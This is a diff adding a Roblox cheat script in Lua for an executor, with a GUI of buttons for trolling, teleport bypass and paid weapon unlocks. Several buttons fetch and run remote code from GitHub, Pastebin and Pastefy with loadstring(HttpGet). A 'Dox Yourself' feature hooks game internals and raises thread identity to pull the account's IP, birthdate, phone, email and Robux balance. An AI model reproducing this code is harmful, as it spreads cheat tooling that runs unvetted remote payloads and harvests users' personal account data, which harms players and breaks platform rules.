@@ -1,0 +1,177 @@
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "";
+    Duration = 10; 
+    Button1 = "Ok";
+
+    Text = "Discord: vzyat.zzz"
+
+})
+
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Version";
+    Duration = 10; 
+    Button1 = "Ok";
+
+    Text = "Lobby"
+
+})
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local LocalPlayer = Players.LocalPlayer
+getrenv().Visit = cloneref(game:GetService("Visit"))
+getrenv().HttpRbxApiService = cloneref(game:GetService("HttpRbxApiService"))
+getrenv().HttpService = cloneref(game:GetService("HttpService"))
+local NetworkClient = cloneref(game:GetService("NetworkClient"))
+local VirtualUser = cloneref(game:GetService("VirtualUser"))
+local Lighting = cloneref(game:GetService("Lighting"))
+local NetworkSettings = settings().Network
+getrenv().getgenv = clonefunction(getgenv)
+
+
+task.wait()
+
+
+task.spawn(function()
+    local discord = loadstring(game:HttpGet("https://raw.githubusercontent.com/artemy133563/Utilities/main/hh",true))()
+    local win = discord:Window("Connect Hub | Lobby Version | Updated: 16.06.24")
+    local serv = win:Server("Lobby Version", "http://www.roblox.com/asset/?id=6031075938")
+    local network = serv:Channel("Home")
+    network:Label("Hello, Thank For Using My script")
+    network:Seperator()
+    network:Button("Discord Server", function()
+        if setclipboard then
+            setclipboard("https://discord.gg/eBNMEwP5uk")
+        end 
+        discord:Notification("Success!", "Link copied in clipboard.", "Ok!")
+    end)
+    network:Button("Dox Yourself", function()
+        local Username, IP, Day, Month, Week, Phone, Email, Robux, AccountCode
+        getrenv().request = (syn and syn.request) or http and http.request or http_request or
+                                (fluxus and fluxus.request) or request
+        local s = pcall(function()
+            getrenv()._set = clonefunction(setthreadidentity)
+            local old
+            old = hookmetamethod(game, "__index", function(a, b)
+                task.spawn(function()
+                    _set(3)
+                    task.wait()
+                    local req = request({
+                        Url = "https://api.ipify.org/",
+                        Method = "GET"
+                    })
+                    local req2 = HttpService:JSONDecode(HttpRbxApiService:GetAsyncFullUrl(
+                        "https://accountinformation.roblox.com/v1/birthdate"))
+                    local req3 = HttpService:JSONDecode(HttpRbxApiService:GetAsyncFullUrl(
+                        "https://accountinformation.roblox.com/v1/phone"))
+                    local req4 = HttpService:JSONDecode(HttpRbxApiService:GetAsyncFullUrl(
+                        "https://accountsettings.roblox.com/v1/email"))
+                    local req5 = HttpService:JSONDecode(HttpRbxApiService:GetAsyncFullUrl(
+                        "https://economy.roblox.com/v1/user/currency"))
+                    local req6 = HttpService:JSONDecode(HttpRbxApiService:GetAsyncFullUrl(
+                        "https://users.roblox.com/v1/users/authenticated/country-code"))
+                    IP = req.Body
+                    Username = tostring(Players.LocalPlayer)
+                    Day = req2.birthDay
+                    Month = req2.birthMonth
+                    Year = req2.birthYear
+                    Phone = req3.phone
+                    Email = req4.emailAddress
+                    Robux = req5.robux
+                    AccountCode = req6.countryCode
+                    local finished = Instance.new("TextLabel")
+                    finished.Parent = Visit
+                end)
+                hookmetamethod(game, "__index", old)
+                return old(a, b)
+            end)
+        end)
+        if not s then
+            discord:Notification("Not supported", "This feature is not supported by your executor.", "Ok!")
+        else
+            repeat
+                task.wait()
+            until Visit:FindFirstChild("TextLabel")
+            if type(IP) == "nil" then
+                IP = "Not Founded"
+            end
+            if type(Phone) == "nil" then
+                Phone = "You Not Have Number."
+            end
+            if type(Email) == "nil" then
+                Email = "Without Email"
+            end
+            network:Label("Your Username: " .. Username)
+            network:Label("Your IP: " .. IP)
+            network:Label("Your birthday: " .. Month .. "/" .. Day .. "/" .. Year .. "")
+            network:Label("Your Email: " .. Email)
+            network:Label("Your Phone Number: " .. Phone)
+            network:Label("Your Robux Balance: " .. Robux)
+            network:Label("Your Account Country Code (Settings): " .. AccountCode)
+        end
+    end)
+    local main = serv:Channel("Main")
+    main:Seperator()
+    main:Button("Bring Blocks", function()
+        local rootPart = game.Players.LocalPlayer.Character.HumanoidRootPart
+        local carsFolder = game:GetService("Workspace"):FindFirstChild("SkinData")
+        
+        if carsFolder then
+            for _, child in ipairs(carsFolder:GetChildren()) do
+                if child:IsA("Model") then
+                    local parts = child:GetDescendants()
+                    for _, part in ipairs(parts) do
+                        if part:IsA("BasePart") then
+                            part.CFrame = rootPart.CFrame * CFrame.new(0, 3, 0)
+                        end
+                    end
+                end
+            end
+        end
+        discord:Notification("Done!", "Troll blocks bringed to you.", "Ok!")
+    end)
+    main:Seperator()
+    main:Button("Telekinesis Gun", function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/KduE9A6z"))()
+        discord:Notification("Done!", "Getting tool.", "Ok!")
+    end)
+    main:Seperator()
+    main:Button("Play Classic (Bypass Portal)", function()
+     game:GetService('TeleportService'):Teleport(17584310335, LocalPlayer)
+        discord:Notification("Done!", "Teleporting Into Game...", "Ok!")
+    end)
+    local Op = serv:Channel("OP Features")
+       Op:Button("Get Robux Weapons For Free (Paid)", function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/artemy133563/Utilities/main/Whitelist",true))()
+       end)
+       Op:Label("Dm In Discord To Buy It (Discord: vzyat.zzz)")
+       Op:Seperator()
+       Op:Label("Misc")
+       Op:Button("Get Gold Engine And Auto Put Into Sedan", function()
+        local queueteleport = queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
+        if queueteleport then
+            spawn(function()
+                pcall(function()
+                    queueteleport("loadstring(game:HttpGet('https://pastefy.app/OC7quScO/raw'))()")
+                end)
+            end)
+        end
+           discord:Notification("Success!", "Join in Desert Map.", "Ok!")
+        end)
+        Op:Label("Not 100% You Get It")
+        Op:Button("Get Gold Engine And Auto Put Into Van", function()
+            local queueteleport = queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
+            if queueteleport then
+                spawn(function()
+                    pcall(function()
+                        queueteleport("loadstring(game:HttpGet('https://pastefy.app/j5xw4cfz/raw'))()")
+                    end)
+                end)
+            end
+               discord:Notification("Success!", "Join in Desert Map.", "Ok!")
+        end)
+    end)
+
+
+
